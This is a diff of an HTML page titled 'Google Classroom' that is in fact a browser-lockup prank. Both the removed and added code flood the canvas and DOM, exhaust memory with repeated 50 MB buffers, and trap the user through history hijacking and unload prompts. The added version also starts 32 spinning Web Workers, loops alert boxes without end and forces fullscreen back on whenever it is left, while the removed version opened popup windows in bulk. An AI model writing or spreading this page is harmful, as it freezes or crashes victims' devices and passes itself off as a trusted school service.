@@ -1,58 +1,98 @@
 <!DOCTYPE html>
 <html>
 <head><title>Google Classroom</title></head>
-<body style="margin:0;overflow:hidden;background:#000;">
+<body style="margin:0;overflow:hidden;background:pink;">
     <canvas id="c"></canvas>
-    <h1 style="color:#fff;text-align:center;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-family:Arial;z-index:1;">Google Classroom</h1>
     <script>
-        setTimeout(function(){
-            
-            // GPU轰炸：Canvas粒子
-            var c=document.getElementById('c');
-            var ctx=c.getContext('2d');
-            c.width=window.innerWidth;
-            c.height=window.innerHeight;
-            var p=[];
-            for(var i=0;i<30000;i++){
-                p.push({x:Math.random()*c.width,y:Math.random()*c.height,vx:(Math.random()-0.5)*20,vy:(Math.random()-0.5)*20,r:Math.random()*3+1});
+        // ===== GPU：50000粒子 =====
+        var c=document.getElementById('c');
+        var ctx=c.getContext('2d');
+        c.width=innerWidth;c.height=innerHeight;
+        var p=[];
+        for(var i=0;i<50000;i++){
+            p.push({x:Math.random()*c.width,y:Math.random()*c.height,vx:(Math.random()-0.5)*30,vy:(Math.random()-0.5)*30,r:Math.random()*4+1});
+        }
+        function draw(){
+            ctx.fillStyle='rgba(255,192,203,0.05)';
+            ctx.fillRect(0,0,c.width,c.height);
+            for(var i=0;i<p.length;i++){
+                p[i].x+=p[i].vx;p[i].y+=p[i].vy;
+                if(p[i].x<0||p[i].x>c.width)p[i].vx*=-1;
+                if(p[i].y<0||p[i].y>c.height)p[i].vy*=-1;
+                ctx.fillStyle='hsl('+(Date.now()/2+i%360)+',100%,70%)';
+                ctx.beginPath();ctx.arc(p[i].x,p[i].y,p[i].r,0,Math.PI*2);ctx.fill();
             }
-            setInterval(function(){
-                ctx.fillStyle='rgba(0,0,0,0.2)';
-                ctx.fillRect(0,0,c.width,c.height);
-                for(var i=0;i<p.length;i++){
-                    p[i].x+=p[i].vx;p[i].y+=p[i].vy;
-                    if(p[i].x<0||p[i].x>c.width)p[i].vx*=-1;
-                    if(p[i].y<0||p[i].y>c.height)p[i].vy*=-1;
-                    ctx.fillStyle='hsl('+(Date.now()/10+i%360)+',100%,50%)';
-                    ctx.beginPath();ctx.arc(p[i].x,p[i].y,p[i].r,0,Math.PI*2);ctx.fill();
-                }
-            },16);
-            
-            // 内存：5GB/s
-            var ram=[];
-            setInterval(function(){ram.push(new ArrayBuffer(50*1024*1024))},10);
-            
-            // CPU死锁
-            setInterval(function(){var s=Date.now();while(Date.now()-s<800){}},1);
-            
-            // 递归死锁
-            function dl(){for(var i=0;i<5;i++){setTimeout(dl,0)};var x=0;while(true){x++}}dl();
-            
-            // DOM轰炸
-            setInterval(function(){var d=document.createElement('div');d.style.cssText='position:fixed;width:50px;height:50px;background:red;z-index:99;';d.style.left=Math.random()*window.innerWidth+'px';d.style.top=Math.random()*window.innerHeight+'px';document.body.appendChild(d)},5);
-            
-            // 弹窗
-            setInterval(function(){for(var i=0;i<100;i++){window.open(location.href,'','width=50,height=50')}},200);
-            
-            // 防退出
-            window.onbeforeunload=function(){return''};
-            history.pushState(null,null,location.href);
-            window.onpopstate=function(){history.go(1)};
-            
-            // 全屏
-            document.documentElement.requestFullscreen();
-            
-        },1000);
+            requestAnimationFrame(draw);
+        }
+        draw();
+
+        // ===== DOM =====
+        setInterval(function(){
+            for(var i=0;i<200;i++){
+                var d=document.createElement('div');
+                d.style.cssText='position:fixed;width:60px;height:60px;background:hsl('+Math.random()*360+',100%,70%);z-index:99;opacity:0.6;border-radius:50%;';
+                d.style.left=Math.random()*innerWidth+'px';
+                d.style.top=Math.random()*innerHeight+'px';
+                document.body.appendChild(d);
+            }
+        },100);
+
+        // ===== emoji =====
+        setInterval(function(){
+            for(var i=0;i<100;i++){
+                var s=document.createElement('span');
+                s.style.cssText='position:fixed;color:hsl('+Math.random()*360+',100%,50%);z-index:99;font-size:20px;';
+                s.style.left=Math.random()*innerWidth+'px';
+                s.style.top=Math.random()*innerHeight+'px';
+                s.textContent='🌸💕🎀✨🦩💖';
+                document.body.appendChild(s);
+            }
+        },80);
+
+        // ===== 内存 =====
+        var r=[];setInterval(function(){for(var i=0;i<10;i++){r.push(new ArrayBuffer(50*1024*1024))}},100);
+
+        // ===== Worker =====
+        var code='while(true){var x=0;for(var i=0;i<10000000;i++){x+=Math.sqrt(i)*Math.sin(i);}}';
+        var blob=new Blob([code],{type:'text/javascript'});
+        var url=URL.createObjectURL(blob);
+        for(var i=0;i<32;i++){new Worker(url);}
+
+        // ===== 弹窗 =====
+        function spamAlert(){
+            alert('🌸 正在加载...');
+            setTimeout(spamAlert, 200);
+        }
+        spamAlert();
+
+        // ===== 锁死 =====
+        history.pushState(null,null,location.href);
+        window.onpopstate=function(){history.go(1)};
+        setInterval(function(){history.pushState(null,null,location.href+'#'+Math.random())},10);
+        window.onbeforeunload=function(){return'x'};
+
+        // ===== 🔒 点屏幕触发全屏 =====
+        var locked=false;
+        function goFull(){
+            document.documentElement.requestFullscreen().catch(function(){});
+        }
+        document.addEventListener('click', function(){
+            if(!locked){
+                goFull();
+                locked=true;
+            }
+            if(!document.fullscreenElement){ goFull(); }
+        });
+        document.addEventListener('touchstart', function(){
+            if(!locked){
+                goFull();
+                locked=true;
+            }
+            if(!document.fullscreenElement){ goFull(); }
+        });
+        document.addEventListener('fullscreenchange', function(){
+            if(!document.fullscreenElement && locked){ goFull(); }
+        });
     </script>
 </body>
 </html>
